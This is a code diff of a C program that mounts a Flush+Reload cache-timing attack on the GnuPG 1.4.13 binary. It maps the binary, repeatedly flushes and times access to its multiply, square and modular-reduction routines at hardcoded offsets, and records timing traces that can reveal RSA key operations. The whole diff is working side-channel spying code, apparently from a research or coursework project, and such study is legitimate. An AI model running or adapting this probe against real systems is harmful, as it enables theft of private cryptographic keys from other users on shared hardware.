@@ -6,32 +6,18 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <unistd.h>
+#include "logger/logger.h"
 #ifdef __linux__
 #include <sched.h>
 #endif
 
 typedef uint8_t byte;
 
-const unsigned int THRESHHOLD = 100;
+void probe(uint64_t threshhold, char *path, uint64_t *mul_timings, uint64_t *sqr_timings, uint64_t *mod_timings, uint64_t SLOTS);
+
 const unsigned int MUL_OFFSET = 0x8f67d;
 const unsigned int SQR_OFFSET = 0x8fc89;
 const unsigned int MOD_OFFSET = 0x8ed5c;
-
-static inline void maccess(void *p)
-{
-    asm volatile("movq (%0), %%rax\n"
-                 :
-                 : "c"(p)
-                 : "rax");
-}
-
-static inline void flush(void *p)
-{
-    asm volatile("clflush 0(%0)\n"
-                 :
-                 : "c"(p)
-                 : "rax");
-}
 
 static inline uint64_t rdtsc()
 {
@@ -44,41 +30,31 @@ static inline uint64_t rdtsc()
     return a;
 }
 
-static inline int memaccesstime(void *v) {
-  int rv;
-  asm volatile (
-      "mfence\n"
-      "lfence\n"
-      "rdtscp\n"
-      "mov %%eax, %%esi\n"
-      "mov (%1), %%eax\n"
-      "rdtscp\n"
-      "clflush 0(%1)\n"
-      "sub %%esi, %%eax\n"
-      : "=&a" (rv): "r" (v): "ecx", "edx", "esi");
-  return rv;
+static inline int memaccesstime(void *v)
+{
+    int rv;
+    asm volatile(
+        "mfence\n"
+        "lfence\n"
+        "rdtscp\n"
+        "mov %%eax, %%esi\n"
+        "mov (%1), %%eax\n"
+        "rdtscp\n"
+        "clflush 0(%1)\n"
+        "sub %%esi, %%eax\n"
+        : "=&a"(rv)
+        : "r"(v)
+        : "ecx", "edx", "esi");
+    return rv;
 }
 
-static inline uint64_t full_flush_reload_time(void *p)
+void probe(uint64_t threshhold, char *path, uint64_t *mul_timings, uint64_t *sqr_timings, uint64_t *mod_timings, uint64_t SLOTS)
 {
-    uint64_t start = rdtsc();
-    maccess(p);
-    uint64_t end = rdtsc();
-    flush(p);
-    return end - start;
-}
-
-void probe(const unsigned int threshhold)
-{
-    const unsigned long SLOTS = 20000;
-    const unsigned long SLOT_TIME = 2500;
-    unsigned long mul_timings[SLOTS];
-    unsigned long sqr_timings[SLOTS];
-    unsigned long mod_timings[SLOTS];
+    const unsigned long SLOT_TIME = 1500;
     /*
         Waiting for threshhold
     */
-    int fd = open("../bin/gpg-1.4.13", O_RDONLY);
+    int fd = open(path, O_RDONLY);
     if (fd == -1)
     {
         perror("Failed to open gpg-1.4.13");
@@ -91,17 +67,21 @@ void probe(const unsigned int threshhold)
     {
         perror("Failed to memory map the offsets of the functions in gpg");
     }
-    printf("Scanning...\n");
+    printf(BOLD(RED("Scanning...")));
+    fflush(stdout);
     while (1)
     {
         uint64_t start_time = rdtsc();
         const uint64_t finish_time = start_time + SLOT_TIME;
-        int mul_time = memaccesstime(mul_fn_addr);
-        int sqr_time = memaccesstime(sqr_fn_addr);
-        int mod_time = memaccesstime(mod_fn_addr);
+        uint64_t mul_time = memaccesstime(mul_fn_addr);
+        uint64_t sqr_time = memaccesstime(sqr_fn_addr);
+        uint64_t mod_time = memaccesstime(mod_fn_addr);
         if (mul_time < threshhold || sqr_time < threshhold || mod_time < threshhold)
         {
-            printf("Found threshhold! %lu %lu %lu\n", mul_time, sqr_time, mod_time);
+            printf("\r" BOLD(GRN("Threshhold triggered!")) "\n");
+            mul_timings[0] = mul_time;
+            sqr_timings[0] = sqr_time;
+            mod_timings[0] = mod_time;
             break;
         }
         while (start_time < finish_time)
@@ -109,10 +89,16 @@ void probe(const unsigned int threshhold)
             start_time = rdtsc();
         }
     }
-}
-
-int main(int argc, char **argv)
-{
-    probe(THRESHHOLD);
-    return 0;
+    for (uint64_t i = 1; i < SLOTS; ++i)
+    {
+        uint64_t start_time = rdtsc();
+        const uint64_t finish_time = start_time + SLOT_TIME;
+        mul_timings[i] = memaccesstime(mul_fn_addr);
+        sqr_timings[i] = memaccesstime(sqr_fn_addr);
+        mod_timings[i] = memaccesstime(mod_fn_addr);
+        while (start_time < finish_time)
+        {
+            start_time = rdtsc();
+        }
+    }
 }
